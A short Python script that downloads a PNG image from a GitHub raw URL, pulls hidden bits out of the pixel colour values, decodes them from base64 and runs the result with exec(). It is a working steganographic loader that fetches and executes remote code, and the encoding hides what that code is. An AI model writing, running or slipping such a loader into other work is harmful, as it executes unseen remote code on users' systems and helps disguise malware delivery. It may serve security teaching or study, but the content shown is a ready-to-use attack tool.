import cv2, base64, requests
import numpy as np

def s2t(s):
    t = ""
    for i in range(0, len(s), 8):
        bits = s[i:i+8]
        char = chr(int(bits, 2))
        t += char
    return t

def dwnld(url):
    response = requests.get(url)
    if response.status_code == 200:
        image_bytes = response.content
        image_array = np.asarray(bytearray(image_bytes), dtype=np.uint8)
        img = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
        return img

def extract(img):
    s = ""
    for x in range(img.shape[0]):
        for y in range(img.shape[1]):
            b, g, r = img[x, y]
            s += bin(b)[-1]
            s += bin(g)[-1]
            s += bin(r)[-1]
    result = s2t(s)
    return result[:result.index('#')]

if __name__ == "__main__":
    exec(base64.b64decode(
        extract(
            dwnld("https://raw.githubusercontent.com/florian-dalwigk/duck/main/mandarin.png"))))